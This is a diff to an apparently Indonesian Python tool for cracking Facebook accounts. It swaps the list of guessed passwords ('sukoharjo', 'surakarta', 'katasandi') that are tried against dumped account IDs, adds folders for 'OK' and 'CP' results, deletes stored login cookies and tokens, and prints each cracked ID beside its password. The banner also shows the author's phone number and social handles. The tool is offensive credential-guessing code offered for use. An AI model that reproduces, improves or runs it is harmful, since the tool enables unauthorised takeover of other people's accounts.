@@ -32,7 +32,7 @@ except:ugen2 = [
 id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
 
 x = '\33[m' # DEFAULT
-k = '\033[93m' # KUNING +
+k = '\033[93m' # MERAH +
 h = '\x1b[1;92m' # HIJAU +
 hh = '\033[32m' # HIJAU -
 u = '\033[95m' # UNGU
@@ -87,15 +87,43 @@ def banner():
 	clear()
 	print("""%s
 	
-
+	
 \33[1;33m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
 \33[1;33m█  \33[mGithub: https://github.com/Faizl027
 \33[1;33m█  \33[mFacebook: Muhammad Faizal XD
 \33[1;33m█  \33[mWhatsApp: 081548733745
-\33[1;33m█  \33[mTools : \33[1;33mFFFF
+\33[1;33m█  \33[mTools : \33[1;33mPRIVAT
 \33[1;33m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
 """%(h))
 
+###----------[ CREATE FOLDER ]---------- ###
+def mkdir_data_login():
+    # Make Directory Login Data
+    try:os.mkdir("login")
+    except:pass
+    # Make Directory Dump
+    try:os.mkdir("dump")
+    except:pass
+    # Make Directory Pass
+    try:os.mkdir("tool")
+    except:pass
+    # Make Directory Result
+    try:os.mkdir("CP")
+    except:pass
+    # Make Directory Result
+    try:os.mkdir("OK")
+    except:pass
+    # Make Directory License
+    try:os.mkdir("license")
+    except:pass
+    # Delete Cookies
+    try:os.remove('login/cookie.json')
+    except:pass
+    # Delete Token
+    try:os.remove('login/token.json')
+    except:pass
+
+###----------[ LOGIN ]---------- ###
 def login():
     resik()
     mkdir_data_login()
@@ -111,7 +139,6 @@ def login():
         tampilan_menu()
     except requests.exceptions.ConnectionError:print('\n   %s[%s•%s] %sTidak Ada Koneksi Internet %s!%s\n'%(M,P,M,P,M,P));exit()
     except (KeyError,IOError,AttributeError):print('\n   %s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P));exit()
-
 		
 def menu(my_name):
 	banner()
@@ -419,7 +446,7 @@ def passwrd():
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = ['bajingan','sayang']
+			pwv = ['sukoharjo','surakarta','katasandi']
 			if len(nmf)<6:
 				if len(frs)<3:
 					pass
@@ -711,7 +738,7 @@ def crack3(idf,pwv):
 								hit2+=1
 					else:pass
 					print('\n')
-					print(f"\33[1;32m╚══[OK BARUS]\33[1;96m{idf}\33[m•\33[1;96m{pw}\n")
+					print(f"\33[1;32m╚══[OK 😥]\33[1;96m{idf}\33[m•\33[1;96m{pw}\n")
 					cek_apk(kuki)
 					break
 
